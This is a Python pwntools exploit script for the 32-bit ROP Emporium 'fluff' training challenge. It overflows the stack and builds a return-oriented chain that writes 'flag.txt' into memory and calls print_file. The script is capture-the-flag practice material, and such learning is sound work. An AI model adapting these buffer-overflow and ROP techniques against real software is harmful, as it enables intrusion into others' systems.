#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /home/batman/CTFs/ropemporium/fluff/32/fluff32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/home/batman/CTFs/ropemporium/fluff/32/fluff32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x08048555
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
toWrite="flag.txt"
bss=0x0804a020
pad=b"A"*cyclic_find(0x6161616c)
rop=ROP(exe)

for index,char in enumerate(toWrite):
    rop.raw(0x08048527) # popal; cld; ret; 
    rop.raw("AAAA")
    rop.raw("BBBB")
    rop.raw('SISI')
    rop.raw('BPBP')
    rop.raw('SSSS')
    rop.raw(char*4)
    rop.raw(bss+index)
    rop.raw('DIDI')
    rop.raw(0x08048555)

rop.print_file(bss)

payload=(
    pad+rop.chain()
)

io = start()
io.sendline(payload)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

